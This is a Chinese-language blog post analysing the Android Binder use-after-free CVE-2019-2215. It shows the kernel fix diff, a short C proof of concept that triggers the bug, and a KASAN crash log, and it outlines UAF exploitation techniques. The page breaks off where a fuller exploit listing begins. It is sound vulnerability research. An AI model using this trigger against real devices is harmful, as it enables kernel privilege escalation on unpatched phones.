<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.5.0',
    exturl: false,
    sidebar: {"position":"right","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":true,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: true,
    mediumzoom: false,
    lazyload: false,
    pangu: true,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: '',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Copy',
      copy_success: 'Copied',
      copy_failure: 'Copy failed'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="Author: GeneBlueBlog: https://geneblue.github.io/ 距离上一个 binder 漏洞（水滴 CVE-2019-2025）只过去寥寥数月，在国庆期间，Android 内核又被爆出一个 binder 内核提权漏洞。宇宙最强安全团队 google pj0 已经给出了漏洞细节，详情可以看这里。看来 binder 模块还是值得长期关注的。这篇文章主要解释 goo">
<meta name="keywords" content="exp">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2019-2215 Binder 内核提权漏洞简要分析">
<meta property="og:url" content="http://yoursite.com/2019/10/23/cve-2019-2215-binder/index.html">
<meta property="og:site_name" content="GeneBlue&#39;s Blog">
<meta property="og:description" content="Author: GeneBlueBlog: https://geneblue.github.io/ 距离上一个 binder 漏洞（水滴 CVE-2019-2025）只过去寥寥数月，在国庆期间，Android 内核又被爆出一个 binder 内核提权漏洞。宇宙最强安全团队 google pj0 已经给出了漏洞细节，详情可以看这里。看来 binder 模块还是值得长期关注的。这篇文章主要解释 goo">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB400a5072aa1eb0d363a265e7d6f92b47?method=download&shareKey=91837beb2479586e101d64a3c4d98ac7">
<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEBbd4fc08a22a28343089b092dea33512f?method=download&shareKey=629b9af63c2450ef2703219655e21b32">
<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB1eb16f0f29288e5d2e2d3d2d2abdf15a?method=download&shareKey=654eefbe6aff4983d3f1fe15415ed3a8">
<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB49e61574f62cc7e27fdde8d86a977e4b?method=download&shareKey=08f5bbbb98411b36c2c22002fc83ee60">
<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB702dae7b981fb57973a492a16c6ed3f1?method=download&shareKey=f0b58df36b09e3e4dd075c64d59e11bf">
<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB8865927433092b711ce1c2ddf1e12b4d?method=download&shareKey=c6a3e033a60b114a47878eb07efe8856">
<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEBae0ec2028e52616a495157859738b57e?method=download&shareKey=9e1f951c548a183fd7f87191c76c20dc">
<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEBd16e9631483f06af97ab2b30fd0a88c9?method=download&shareKey=75974561c37e95a4754743fc90b84ac6">
<meta property="og:updated_time" content="2019-12-10T07:24:34.615Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2019-2215 Binder 内核提权漏洞简要分析">
<meta name="twitter:description" content="Author: GeneBlueBlog: https://geneblue.github.io/ 距离上一个 binder 漏洞（水滴 CVE-2019-2025）只过去寥寥数月，在国庆期间，Android 内核又被爆出一个 binder 内核提权漏洞。宇宙最强安全团队 google pj0 已经给出了漏洞细节，详情可以看这里。看来 binder 模块还是值得长期关注的。这篇文章主要解释 goo">
<meta name="twitter:image" content="https://note.youdao.com/yws/api/personal/file/WEB400a5072aa1eb0d363a265e7d6f92b47?method=download&shareKey=91837beb2479586e101d64a3c4d98ac7">

<link rel="canonical" href="http://yoursite.com/2019/10/23/cve-2019-2215-binder/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: false,
    isPost: true,
    isPage: false,
    isArchive: false
  };
</script>

  <title>CVE-2019-2215 Binder 内核提权漏洞简要分析 | GeneBlue's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">GeneBlue's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <h1 class="site-subtitle" itemprop="description">The quiter you become,the more you are able to hear!</h1>
      
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/23/cve-2019-2215-binder/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="GeneBlue">
      <meta itemprop="description" content="Personal Blog">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="GeneBlue's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          CVE-2019-2215 Binder 内核提权漏洞简要分析
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-10-23 12:02:08" itemprop="dateCreated datePublished" datetime="2019-10-23T12:02:08+08:00">2019-10-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-12-10 15:24:34" itemprop="dateModified" datetime="2019-12-10T15:24:34+08:00">2019-12-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong>Author: GeneBlue</strong><br><strong>Blog: <a href="https://geneblue.github.io/" target="_blank" rel="noopener">https://geneblue.github.io/</a></strong></p>
<p>距离上一个 binder 漏洞（水滴 <code>CVE-2019-2025</code>）只过去寥寥数月，在国庆期间，Android 内核又被爆出一个 binder 内核提权漏洞。宇宙最强安全团队 <code>google pj0</code> 已经给出了漏洞细节，详情可以看<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942" target="_blank" rel="noopener">这里</a>。看来 binder 模块还是值得长期关注的。这篇文章主要解释 google poc 的利用原理。</p>
<a id="more"></a>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先来看看 <a href="https://github.com/torvalds/linux/commit/7a3cee43e935b9d526ad07f20bf005ba7e74d05b" target="_blank" rel="noopener">fix commit</a> 吧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ANDROID: binder: remove waitqueue when thread exits.</span><br><span class="line"></span><br><span class="line">commit f5cb779 upstream.</span><br><span class="line"></span><br><span class="line">binder_poll() passes the thread-&gt;wait waitqueue that</span><br><span class="line">can be slept on <span class="keyword">for</span> work. When a thread that uses</span><br><span class="line">epoll explicitly exits <span class="keyword">using</span> BINDER_THREAD_EXIT,</span><br><span class="line">the waitqueue is freed, but it is never removed</span><br><span class="line">from the corresponding epoll data structure. When</span><br><span class="line">the process subsequently exits, the epoll cleanup</span><br><span class="line">code tries to access the waitlist, which results in</span><br><span class="line">a use-after-<span class="built_in">free</span>.</span><br><span class="line"></span><br><span class="line">Prevent <span class="keyword">this</span> by <span class="keyword">using</span> POLLFREE when the thread exits.</span><br><span class="line"></span><br><span class="line">Signed-off-by: Martijn Coenen &lt;maco@android.com&gt;</span><br><span class="line">Reported-by: syzbot &lt;syzkaller@googlegroups.com&gt;</span><br><span class="line">Signed-off-by: Greg Kroah-Hartman &lt;gregkh@linuxfoundation.org&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">diff --git a/drivers/android/binder.c b/drivers/android/binder.c</span><br><span class="line">index a340766.<span class="number">.2</span>ef8bd2 <span class="number">100644</span></span><br><span class="line">--- a/drivers/android/binder.c</span><br><span class="line">+++ b/drivers/android/binder.c</span><br><span class="line">@@ <span class="number">-4302</span>,<span class="number">6</span> +<span class="number">4302</span>,<span class="number">18</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">binder_thread_release</span><span class="params">(struct binder_proc *proc,</span></span></span><br><span class="line"><span class="function"><span class="params"> 		<span class="keyword">if</span> (t)</span></span></span><br><span class="line"><span class="function"><span class="params"> 			spin_lock(&amp;t-&gt;lock);</span></span></span><br><span class="line"><span class="function"><span class="params"> 	&#125;</span></span></span><br><span class="line"><span class="function"><span class="params">+</span></span></span><br><span class="line"><span class="function"><span class="params">+	<span class="comment">/*</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">+	 * If this thread used poll, make sure we remove the waitqueue</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">+	 * from any epoll data structures holding it with POLLFREE.</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">+	 * waitqueue_active() is safe to use here because we're holding</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">+	 * the inner lock.</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">+	 */</span></span></span></span><br><span class="line"><span class="function"><span class="params">+	<span class="keyword">if</span> ((thread-&gt;looper &amp; BINDER_LOOPER_STATE_POLL) &amp;&amp;</span></span></span><br><span class="line"><span class="function"><span class="params">+	    waitqueue_active(&amp;thread-&gt;wait)) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">+		wake_up_poll(&amp;thread-&gt;wait, POLLHUP | POLLFREE);</span></span></span><br><span class="line"><span class="function"><span class="params">+	&#125;</span></span></span><br><span class="line"><span class="function"><span class="params">+</span></span></span><br><span class="line"><span class="function"><span class="params"> 	binder_inner_proc_unlock(thread-&gt;proc);</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"> 	<span class="keyword">if</span> (send_reply)</span></span></span><br></pre></td></tr></table></figure>

<p>原来这个漏洞是 linux 内核 fuzz 工具 <code>syzkaller</code> 上报的。从 commit 看，这是一个 UAF 问题, 函数 <code>binder_thread_release()</code> 用于释放 thread 结构数据，但当使用 epoll 对 binder fd 做 IO 复用时，该函数并没有在 release 的时候将 <code>thread-&gt;wait</code> 从 epoll 的内核链表中剔除。之后，进程退出或调用 epoll 清理操作时，内核会遍历删除 epoll 内核链表，这会再次访问之前已经释放的 thread 结构数据，UAF 产生。</p>
<p>UAF 的利用过程一般是，先确定 UAF 的结构数据是谁，如果该结构中有直接可用的函数指针，<code>heapspray</code> 等占位方式覆盖该指针，后期触发该函数即可控制 pc，这种情况比较少；对于有链表的情况，覆盖占位链表结构，触发时观察对链表的修改情况，再判断能否做内核读写；其他情形嘛，直接填充满非法数据比如 <code>0xdeadc0dedeadc0de</code> 之类的，看看内核啥反应。</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>在开启 KASAN 的内核中，一个可触发 KASAN 的poc 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINDER_THREAD_EXIT 0x40046208ul</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd, epfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> = &#123;</span> .events = EPOLLIN &#125;;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/dev/binder0"</span>, O_RDONLY);</span><br><span class="line">    epfd = epoll_create(<span class="number">1000</span>);</span><br><span class="line">    epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event);</span><br><span class="line">    ioctl(fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>KASAN crash log：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">[  <span class="number">464.504747</span>] c0   <span class="number">3033</span> BUG: KASAN: use-after-<span class="built_in">free</span> in remove_wait_queue+<span class="number">0x48</span>/<span class="number">0x90</span></span><br><span class="line">[  <span class="number">464.511836</span>] c0   <span class="number">3033</span> Write of size <span class="number">8</span> at addr <span class="number">0000000000000000</span> by task <span class="keyword">new</span>.out/<span class="number">3033</span></span><br><span class="line">[  <span class="number">464.518893</span>] c0   <span class="number">3033</span></span><br><span class="line">[  <span class="number">464.526548</span>] c0   <span class="number">3033</span> CPU: <span class="number">0</span> PID: <span class="number">3033</span> Comm: <span class="keyword">new</span>.out Tainted: G         C      <span class="number">4.4</span><span class="number">.177</span>-ga9e0ec5cb774 #<span class="number">1</span></span><br><span class="line">[  <span class="number">464.529044</span>] c0   <span class="number">3033</span> Hardware name: Qualcomm Technologies, Inc. MSM8998 v2<span class="number">.1</span> (DT)</span><br><span class="line">[  <span class="number">464.538334</span>] c0   <span class="number">3033</span> Call trace:</span><br><span class="line">[  <span class="number">464.545928</span>] c0   <span class="number">3033</span> [&lt;ffffff900808f0e8&gt;] dump_backtrace+<span class="number">0x0</span>/<span class="number">0x34c</span></span><br><span class="line">[  <span class="number">464.549328</span>] c0   <span class="number">3033</span> [&lt;ffffff900808f574&gt;] show_stack+<span class="number">0x1c</span>/<span class="number">0x24</span></span><br><span class="line">[  <span class="number">464.555411</span>] c0   <span class="number">3033</span> [&lt;ffffff900858bcc8&gt;] dump_stack+<span class="number">0xb8</span>/<span class="number">0xe8</span></span><br><span class="line">[  <span class="number">464.561319</span>] c0   <span class="number">3033</span> [&lt;ffffff90082b1ecc&gt;] print_address_description+<span class="number">0x94</span>/<span class="number">0x334</span></span><br><span class="line">[  <span class="number">464.567219</span>] c0   <span class="number">3033</span> [&lt;ffffff90082b23f0&gt;] kasan_report+<span class="number">0x1f8</span>/<span class="number">0x340</span></span><br><span class="line">[  <span class="number">464.574501</span>] c0   <span class="number">3033</span> [&lt;ffffff90082b0740&gt;] __asan_store8+<span class="number">0x74</span>/<span class="number">0x90</span></span><br><span class="line">[  <span class="number">464.580753</span>] c0   <span class="number">3033</span> [&lt;ffffff9008139fc0&gt;] remove_wait_queue+<span class="number">0x48</span>/<span class="number">0x90</span></span><br><span class="line">[  <span class="number">464.587125</span>] c0   <span class="number">3033</span> [&lt;ffffff9008336874&gt;] ep_unregister_pollwait.isra<span class="number">.8</span>+<span class="number">0xa8</span>/<span class="number">0xec</span></span><br><span class="line">[  <span class="number">464.593617</span>] c0   <span class="number">3033</span> [&lt;ffffff9008337744&gt;] ep_free+<span class="number">0x74</span>/<span class="number">0x11c</span></span><br><span class="line">[  <span class="number">464.601149</span>] c0   <span class="number">3033</span> [&lt;ffffff9008337820&gt;] ep_eventpoll_release+<span class="number">0x34</span>/<span class="number">0x48</span></span><br><span class="line">[  <span class="number">464.606988</span>] c0   <span class="number">3033</span> [&lt;ffffff90082c589c&gt;] __fput+<span class="number">0x10c</span>/<span class="number">0x32c</span></span><br><span class="line">[  <span class="number">464.613724</span>] c0   <span class="number">3033</span> [&lt;ffffff90082c5b38&gt;] ____fput+<span class="number">0x18</span>/<span class="number">0x20</span></span><br><span class="line">[  <span class="number">464.619463</span>] c0   <span class="number">3033</span> [&lt;ffffff90080eefdc&gt;] task_work_run+<span class="number">0xd0</span>/<span class="number">0x128</span></span><br><span class="line">[  <span class="number">464.625193</span>] c0   <span class="number">3033</span> [&lt;ffffff90080bd890&gt;] do_exit+<span class="number">0x3e4</span>/<span class="number">0x1198</span></span><br><span class="line">[  <span class="number">464.631260</span>] c0   <span class="number">3033</span> [&lt;ffffff90080c0ff8&gt;] do_group_exit+<span class="number">0x7c</span>/<span class="number">0x128</span></span><br><span class="line">[  <span class="number">464.637167</span>] c0   <span class="number">3033</span> [&lt;ffffff90080c10c4&gt;] __wake_up_parent+<span class="number">0x0</span>/<span class="number">0x44</span></span><br><span class="line">[  <span class="number">464.643421</span>] c0   <span class="number">3033</span> [&lt;ffffff90080842b0&gt;] el0_svc_naked+<span class="number">0x24</span>/<span class="number">0x28</span></span><br><span class="line">[  <span class="number">464.649944</span>] c0   <span class="number">3033</span></span><br><span class="line">[  <span class="number">464.655899</span>] c0   <span class="number">3033</span> Allocated by task <span class="number">3033</span>:</span><br><span class="line">[  <span class="number">464.658257</span>]  [&lt;ffffff900808e5a4&gt;] save_stack_trace_tsk+<span class="number">0x0</span>/<span class="number">0x204</span></span><br><span class="line">[  <span class="number">464.663899</span>]  [&lt;ffffff900808e7c8&gt;] save_stack_trace+<span class="number">0x20</span>/<span class="number">0x28</span></span><br><span class="line">[  <span class="number">464.669882</span>]  [&lt;ffffff90082b0b14&gt;] kasan_kmalloc.part<span class="number">.5</span>+<span class="number">0x50</span>/<span class="number">0x124</span></span><br><span class="line">[  <span class="number">464.675528</span>]  [&lt;ffffff90082b0e38&gt;] kasan_kmalloc+<span class="number">0xc4</span>/<span class="number">0xe4</span></span><br><span class="line">[  <span class="number">464.681597</span>]  [&lt;ffffff90082ac8a4&gt;] kmem_cache_alloc_trace+<span class="number">0x12c</span>/<span class="number">0x240</span></span><br><span class="line">[  <span class="number">464.686992</span>]  [&lt;ffffff90094093c0&gt;] binder_get_thread+<span class="number">0xdc</span>/<span class="number">0x384</span></span><br><span class="line">[  <span class="number">464.693319</span>]  [&lt;ffffff900940969c&gt;] binder_poll+<span class="number">0x34</span>/<span class="number">0x1bc</span></span><br><span class="line">[  <span class="number">464.699127</span>]  [&lt;ffffff900833839c&gt;] SyS_epoll_ctl+<span class="number">0x704</span>/<span class="number">0xf84</span></span><br><span class="line">[  <span class="number">464.704423</span>]  [&lt;ffffff90080842b0&gt;] el0_svc_naked+<span class="number">0x24</span>/<span class="number">0x28</span></span><br><span class="line">[  <span class="number">464.709971</span>] c0   <span class="number">3033</span></span><br><span class="line">[  <span class="number">464.714124</span>] c0   <span class="number">3033</span> Freed by task <span class="number">3033</span>:</span><br><span class="line">[  <span class="number">464.716396</span>]  [&lt;ffffff900808e5a4&gt;] save_stack_trace_tsk+<span class="number">0x0</span>/<span class="number">0x204</span></span><br><span class="line">[  <span class="number">464.721699</span>]  [&lt;ffffff900808e7c8&gt;] save_stack_trace+<span class="number">0x20</span>/<span class="number">0x28</span></span><br><span class="line">[  <span class="number">464.727678</span>]  [&lt;ffffff90082b16a4&gt;] kasan_slab_free+<span class="number">0xb0</span>/<span class="number">0x1c0</span></span><br><span class="line">[  <span class="number">464.733322</span>]  [&lt;ffffff90082ae214&gt;] kfree+<span class="number">0x8c</span>/<span class="number">0x2b4</span></span><br><span class="line">[  <span class="number">464.738952</span>]  [&lt;ffffff900940ac00&gt;] binder_thread_dec_tmpref+<span class="number">0x15c</span>/<span class="number">0x1c0</span></span><br><span class="line">[  <span class="number">464.743750</span>]  [&lt;ffffff900940d590&gt;] binder_thread_release+<span class="number">0x284</span>/<span class="number">0x2e0</span></span><br><span class="line">[  <span class="number">464.750253</span>]  [&lt;ffffff90094149e0&gt;] binder_ioctl+<span class="number">0x6f4</span>/<span class="number">0x3664</span></span><br><span class="line">[  <span class="number">464.756498</span>]  [&lt;ffffff90082e1364&gt;] do_vfs_ioctl+<span class="number">0x7f0</span>/<span class="number">0xd58</span></span><br><span class="line">[  <span class="number">464.762052</span>]  [&lt;ffffff90082e1968&gt;] SyS_ioctl+<span class="number">0x9c</span>/<span class="number">0xc0</span></span><br><span class="line">[  <span class="number">464.767513</span>]  [&lt;ffffff90080842b0&gt;] el0_svc_naked+<span class="number">0x24</span>/<span class="number">0x28</span></span><br><span class="line">[  <span class="number">464.772554</span>] c0   <span class="number">3033</span></span><br><span class="line">[  <span class="number">464.776731</span>] c0   <span class="number">3033</span> The buggy address belongs to the object at <span class="number">0000000000000000</span></span><br><span class="line">[  <span class="number">464.776731</span>] c0   <span class="number">3033</span>  which belongs to the cache kmalloc<span class="number">-512</span> of size <span class="number">512</span></span><br><span class="line">[  <span class="number">464.779151</span>] c0   <span class="number">3033</span> The buggy address is located <span class="number">176</span> bytes inside of</span><br><span class="line">[  <span class="number">464.779151</span>] c0   <span class="number">3033</span>  <span class="number">512</span>-byte region [<span class="number">0000000000000000</span>, <span class="number">0000000000000000</span>)</span><br><span class="line">[  <span class="number">464.793269</span>] c0   <span class="number">3033</span> The buggy address belongs to the page:</span><br></pre></td></tr></table></figure>

<p>从 kasan 的 log 中，我们可以得到 uaf 触发时的调用链。</p>
<p>漏洞作者 <code>Maddie Stone</code> 贴心的给出一份可利用的 poc，从这份 poc 看，显然该漏洞是可以做到内核任意地址读写的。能做到任意读写，就能随意折腾内核，做过内核提权的同学，想必对接下来的套路就比较熟悉了。</p>
<p>POC:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span 